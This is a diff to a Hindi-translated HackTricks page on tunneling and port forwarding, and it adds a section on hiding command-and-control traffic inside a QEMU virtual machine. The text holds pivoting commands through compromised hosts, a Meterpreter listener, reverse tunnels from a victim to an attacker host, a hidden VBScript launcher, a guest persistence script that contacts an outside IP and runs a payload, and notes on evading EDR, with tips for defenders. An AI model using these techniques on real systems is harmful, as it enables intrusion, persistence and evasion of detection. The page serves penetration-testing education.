@@ -1,4 +1,4 @@
-# टनलिंग और पोर्ट फॉरवर्डिंग
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> जहाँ भी
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -93,7 +93,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-आप **ssh** के माध्यम से **ट्रैफ़िक** को एक **उपनेटवर्क** के माध्यम से एक होस्ट पर **टनल** कर सकते हैं।\
+आप **ssh** के माध्यम से एक होस्ट के माध्यम से **उपनेटवर्क** के लिए सभी **ट्रैफ़िक** को **टनल** कर सकते हैं।\
 उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी ट्रैफ़िक को फॉरवर्ड करना
 ```bash
 pip install sshuttle
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा है जिसे **बिकन के माध्यम से ट्रैफ़िक को रूट करने के लिए** उपयोग किया जा सकता है।
+टीमसर्वर में एक पोर्ट खोलें जो सभी इंटरफेस में सुन रहा है जिसे **बिकन के माध्यम से ट्रैफ़िक को रूट करने** के लिए उपयोग किया जा सकता है।
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### SSL Socat के माध्यम से Meterpreter
+### Meterpreter के माध्यम से SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -335,7 +335,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-आपको एक स्थानीय व्यवस्थापक होना आवश्यक है (किसी भी पोर्ट के लिए)
+आपको स्थानीय व्यवस्थापक होना आवश्यक है (किसी भी पोर्ट के लिए)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -372,7 +372,7 @@ netstat -antb | findstr 1080
 
 ## Windows GUI ऐप्स को प्रॉक्सी करें
 
-आप Windows GUI ऐप्स को [**Proxifier**](https://www.proxifier.com/) का उपयोग करके प्रॉक्सी के माध्यम से नेविगेट कर सकते हैं।\
+आप Windows GUI ऐप्स को [**Proxifier**](https://www.proxifier.com/) का उपयोग करके प्रॉक्सी के माध्यम से नेविगेट करवा सकते हैं।\
 **Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
 **Profile -> Proxification Rules** में प्रॉक्सी करने के लिए प्रोग्राम का नाम और उन IPs के लिए कनेक्शन जोड़ें जिन्हें आप प्रॉक्सी करना चाहते हैं।
 
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-अब, यदि आप उदाहरण के लिए पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
+अब, यदि आप पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
 आप एक **meterpreter** का भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट होता है और हमलावर पोर्ट 2222 पर सुन रहा है।
 
 ## YARP
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS बदलें
 
-Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और TCP DNS अनुरोध को SOCKS प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** के रूप में, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
+Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
 
 ## Go में टनल
 
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **एक उपकरण है जो एक कमांड लाइन में समाधानों को इंटरनेट पर उजागर करता है।**\
-_उजागर URI इस तरह हैं:_ **UID.ngrok.io**
+_उजागर URI इस तरह के होते हैं:_ **UID.ngrok.io**
 
 ### Installation
 
@@ -496,13 +496,13 @@ chmod a+x ./ngrok
 # Init configuration, with your token
 ./ngrok config edit
 ```
-### मूल उपयोग
+### Basic usages
 
-**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
 _यदि आवश्यक हो, तो प्रमाणीकरण और TLS जोड़ना भी संभव है।_
 
-#### TCP टनलिंग
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -532,7 +532,7 @@ stdout से सीधे या HTTP इंटरफ़ेस में [http:
 यह 3 टनल खोलता है:
 
 - 2 TCP
-- 1 HTTP जिसमें /tmp/httpbin/ से स्थिर फ़ाइलों का प्रदर्शन होता है
+- 1 HTTP जो /tmp/httpbin/ से स्थिर फ़ाइलों का प्रदर्शन करता है
 ```yaml
 tunnels:
 mytcp:
@@ -576,7 +576,7 @@ cloudflared tunnel run mytunnel
 ```
 क्योंकि सभी ट्रैफ़िक होस्ट से **443 पर आउटबाउंड** निकलता है, Cloudflared टनल इनग्रेस ACLs या NAT सीमाओं को बायपास करने का एक सरल तरीका है। ध्यान दें कि बाइनरी आमतौर पर उच्च विशेषाधिकारों के साथ चलती है - जब संभव हो, कंटेनरों का उपयोग करें या `--user` ध्वज का उपयोग करें।
 
-## FRP (फास्ट रिवर्स प्रॉक्सी)
+## FRP (Fast Reverse Proxy)
 
 [`frp`](https://github.com/fatedier/frp) एक सक्रिय रूप से बनाए रखा जाने वाला Go रिवर्स-प्रॉक्सी है जो **TCP, UDP, HTTP/S, SOCKS और P2P NAT-hole-punching** का समर्थन करता है। **v0.53.0 (मई 2024)** से शुरू होकर, यह एक **SSH टनल गेटवे** के रूप में कार्य कर सकता है, ताकि एक लक्षित होस्ट केवल स्टॉक OpenSSH क्लाइंट का उपयोग करके एक रिवर्स टनल स्थापित कर सके - कोई अतिरिक्त बाइनरी की आवश्यकता नहीं है।
 
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-उपरोक्त कमांड पीड़ित के पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है बिना किसी अतिरिक्त उपकरण को तैनात किए – यह लिविंग-ऑफ-द-लैंड पिवोटिंग के लिए आदर्श है।
+उपरोक्त कमांड पीड़ित के पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है बिना किसी अतिरिक्त उपकरण को तैनात किए – लिविंग-ऑफ-द-लैंड पिवोटिंग के लिए आदर्श।
 
-## अन्य उपकरणों की जांच करें
+## QEMU के साथ गुप्त VM-आधारित टनल
+
+QEMU के उपयोगकर्ता-मोड नेटवर्किंग (`-netdev user`) में `hostfwd` नामक एक विकल्प का समर्थन किया जाता है जो **एक TCP/UDP पोर्ट को *होस्ट* पर बाइंड करता है और इसे *गेस्ट* में अग्रेषित करता है**। जब गेस्ट एक पूर्ण SSH डेमन चलाता है, तो hostfwd नियम आपको एक नष्ट करने योग्य SSH जंप बॉक्स देता है जो पूरी तरह से एक अस्थायी VM के अंदर रहता है – EDR से C2 ट्रैफ़िक को छिपाने के लिए सही क्योंकि सभी दुर्भावनापूर्ण गतिविधियाँ और फ़ाइलें वर्चुअल डिस्क में रहती हैं।
+
+### त्वरित एक-लाइनर
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• उपरोक्त कमांड एक **Tiny Core Linux** इमेज (`tc.qcow2`) को RAM में लॉन्च करता है।  
+• Windows होस्ट पर पोर्ट **2222/tcp** को मेहमान के अंदर **22/tcp** पर पारदर्शी रूप से अग्रेषित किया जाता है।  
+• हमलावर के दृष्टिकोण से लक्ष्य बस पोर्ट 2222 को उजागर करता है; जो भी पैकेट इसे पहुंचते हैं, उन्हें VM में चल रहे SSH सर्वर द्वारा संभाला जाता है।  
+
+### VBScript के माध्यम से चुपचाप लॉन्च करना
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+`cscript.exe //B update.vbs` के साथ स्क्रिप्ट चलाने से विंडो छिपी रहती है।
+
+### गेस्ट में स्थायीता
+
+चूंकि Tiny Core स्टेटलेस है, हमलावर आमतौर पर:
+
+1. `/opt/123.out` पर पेलोड ड्रॉप करते हैं
+2. `/opt/bootlocal.sh` में जोड़ते हैं:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. पेलोड को `mydata.tgz` में पैक करने के लिए `/opt/filetool.lst` में `home/tc` और `opt` जोड़ते हैं जब सिस्टम बंद होता है।
+
+### यह पहचान से कैसे बचता है
+
+• केवल दो असाइन किए गए निष्पादन योग्य (`qemu-system-*.exe`) डिस्क को छूते हैं; कोई ड्राइवर या सेवाएँ स्थापित नहीं हैं।
+• होस्ट पर सुरक्षा उत्पाद **सौम्य लूपबैक ट्रैफ़िक** देखते हैं (वास्तविक C2 VM के अंदर समाप्त होता है)।
+• मेमोरी स्कैनर कभी भी दुर्भावनापूर्ण प्रक्रिया स्थान का विश्लेषण नहीं करते क्योंकि यह एक अलग OS में रहता है।
+
+### डिफेंडर टिप्स
+
+• उपयोगकर्ता-लिखने योग्य पथों में **अप्रत्याशित QEMU/VirtualBox/KVM बाइनरी** पर अलर्ट करें।
+• `qemu-system*.exe` से उत्पन्न आउटबाउंड कनेक्शनों को ब्लॉक करें।
+• QEMU लॉन्च के तुरंत बाद बाइंडिंग करने वाले दुर्लभ लिसनिंग पोर्ट (2222, 10022, …) के लिए शिकार करें।
+
+---
+
+## जांचने के लिए अन्य उपकरण
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## संदर्भ
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
